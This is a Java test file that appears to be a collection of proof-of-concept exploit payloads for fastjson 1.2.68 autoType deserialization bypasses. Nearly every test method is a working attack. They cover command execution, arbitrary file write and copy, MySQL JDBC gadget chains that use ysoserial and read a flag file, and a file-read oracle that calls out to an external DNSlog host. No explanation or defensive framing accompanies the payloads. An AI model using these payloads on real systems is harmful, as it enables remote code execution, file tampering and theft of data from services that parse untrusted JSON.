import com.alibaba.fastjson.JSON;
import org.junit.Test;

public class fastjson_1_2_68_jdk11 {
    @Test
    public void vulDemo() {
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"Test\",\"cmd\":\"open -a Calculator.app\"}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void writeDemo() throws Exception {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.FileOutputStream\",\"file\":\"/Users/ppp/Desktop/dododod\",\"append\":\"false\"}";
        payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.FileWriter\",\"file\":\"/Users/ppp/Desktop/dododod\",\"append\":\"false\"}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void writeDemo1() throws Exception {
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"sun.rmi.server.MarshalOutputStream\",\"out\":{\"@type\":\"java.util.zip.InflaterOutputStream\",\"out\":{\"@type\":\"java.io.FileOutputStream\",\"file\":\"/Users/ppp/Desktop/test\",\"append\":true},\"infl\":{\"input\":{\"array\":\"eJxLLE5JTCkGAAh5AnE=\",\"limit\":14}},\"bufLen\":\"100\"},\"protocolVersion\":1}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void copyDemo() throws Exception {
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\"targetPath\":\"/Users/ppp/Desktop/test\",\"tempPath\":\"/Users/ppp/Desktop/dododod\"}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void writeDemo2() throws Exception {
        String payload = "{\"stream\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\"targetPath\":\"a\",\"tempPath\":\"b\"},\"writer\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.esotericsoftware.kryo.io.Output\",\"buffer\":\"Y2VzaGk=\",\"outputStream\":{\"$ref\":\"$.stream\"},\"position\":5},\"close\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sleepycat.bind.serial.SerialOutput\",\"out\":{\"$ref\":\"$.writer\"}}}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void mysql1Demo() throws Exception {
        // yso
        String payload = "{\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
                "    \"hostToConnectTo\": \"127.0.0.1\",\n" +
                "    \"portToConnectTo\": 3306,\n" +
                "    \"info\": {\n" +
                "        \"user\": \"yso_CommonsCollections5_open -a Calculator.app\",\n" +
                "        \"password\": \"pass\",\n" +
                "        \"maxAllowedPacket\": \"655360\",\n" +
                "        \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "        \"autoDeserialize\": \"true\",\n" +
                "        \"NUM_HOSTS\": \"1\"\n" +
                "    },\n" +
                "    \"databaseToConnectTo\": \"dbname\",\n" +
                "    \"url\": \"\"\n" +
                "}";
        // file read
//        payload = "{\n" +
//                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
//                "    \"@type\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
//                "    \"hostToConnectTo\": \"127.0.0.1\",\n" +
//                "    \"portToConnectTo\": 3306,\n" +
//                "    \"info\": {\n" +
//                "        \"user\": \"fileread_/tmp/flag\",\n" +
//                "        \"password\": \"pass\",\n" +
//                "        \"maxAllowedPacket\": \"655360\",\n" +
//                "        \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
//                "        \"autoDeserialize\": \"true\",\n" +
//                "        \"NUM_HOSTS\": \"1\"\n" +
//                "    },\n" +
//                "    \"databaseToConnectTo\": \"dbname\",\n" +
//                "    \"url\": \"\"\n" +
//                "}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void mysql2Demo() throws Exception {
        // yso
        String payload = "{\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\n" +
                "    \"proxy\": {\n" +
                "        \"connectionString\": {\n" +
                "            \"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        // file read
        payload = "{\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\n" +
                "    \"proxy\": {\n" +
                "        \"connectionString\": {\n" +
                "            \"url\": \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=fileread_/tmp/flag\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void mysql3Demo() throws Exception {
        String payload = "{\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\n" +
                "    \"proxy\": {\n" +
                "        \"@type\": \"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\n" +
                "        \"connectionUrl\": {\n" +
                "            \"@type\": \"com.mysql.cj.conf.url.ReplicationConnectionUrl\",\n" +
                "            \"masters\": [\n" +
                "                {\n" +
                "                    \"host\": \"127.0.0.1\"\n" +
                "                }\n" +
                "            ],\n" +
                "            \"slaves\": [],\n" +
                "            \"properties\": {\n" +
                "                \"host\": \"127.0.0.1\",\n" +
                "                \"user\": \"fileread_/tmp/flag\",\n" +
//                "                \"user\": \"yso_CommonsCollections5_open -a Calculator.app\",\n" +
                "                \"dbname\": \"dbname\",\n" +
                "                \"password\": \"pass\",\n" +
                "                \"queryInterceptors\": \"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "                \"autoDeserialize\": \"true\",\n" +
                "                \"allowLoadLocalInfile\": \"true\"\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void readDemo1() throws Exception {
        String payload = "{\"abc\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":{\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"file:///Users/ppp/Desktop/a\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"boms\":[{\"charsetName\":\"UTF-8\",\"bytes\":[116,101,115,116]}]},\"address\":{\"$ref\":\"$.abc.BOM\"}}";
        Object jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject.toString());
    }

    @Test
    public void readDemo2() throws Exception {
        String payload = "{\n" +
                "    \"abc\": {\n" +
                "\t\t\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "        \"delegate\": {\n" +
                "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "            \"reader\": {\n" +
                "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "                \"url\": \"file:///Users/ppp/Documents/dev/PPPVULNS/fastjsonDemo/fastjson_1_2_68_jdk11/a\"\n" +
                "            },\n" +
                "            \"charsetName\": \"UTF-8\",\n" +
                "            \"bufferSize\": 1024\n" +
                "        },\n" +
                "        \"boms\": [\n" +
                "            {\n" +
                "                \"charsetName\": \"UTF-8\",\n" +
                "                \"bytes\": [\n" +
                "                    116,101,115,116\n" +
                "                ]\n" +
                "            }\n" +
                "        ]\n" +
                "    },\n" +
                "    \"address\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "        \"charSequence\": {\n" +
                "            \"@type\": \"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"},\n" +
                "            \"start\": 0,\n" +
                "            \"end\": 0\n" +
                "        }\n" +
                "    }\n" +
                "}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void readDemo3() throws Exception {
        String payload = "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "    \"delegate\": {\n" +
                "\t  \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\": {\n" +
                "\t\t\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "        \"url\": \"file:///Users/ppp/Desktop/a\"\n" +
                "      },\n" +
                "      \"charsetName\": \"UTF-8\",\n" +
                "      \"bufferSize\": 1024\n" +
                "    },\"boms\": [\n" +
                "      {\n" +
                "        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bytes\": [116,101,115,116]\n" +
                "      }\n" +
                "    ]\n" +
                "  },\n" +
                "  \"address\": {\n" +
                "\t  \"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t  \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "\t  \"delegate\": {\n" +
                "\t\t\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "\t\t\"reader\": {\n" +
                "\t\t  \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "\t\t  \"url\": \"http://b8f3710b.dns.1433.eu.org.\"\n" +
                "\t\t},\n" +
                "\t\t\"charsetName\": \"UTF-8\",\n" +
                "\t\t\"bufferSize\": 1024\n" +
                "\t  },\n" +
                "\t  \"boms\": [{\"$ref\":\"$.abc.BOM[0]\"}]\n" +
                "  },\n" +
                "  \"xxx\":{\"$ref\":\"$.address.BOM[0]\"}\n" +
                "}";
        Object jsonObject = JSON.parseObject(payload);
//        System.out.println(jsonObject.toString());
    }

}
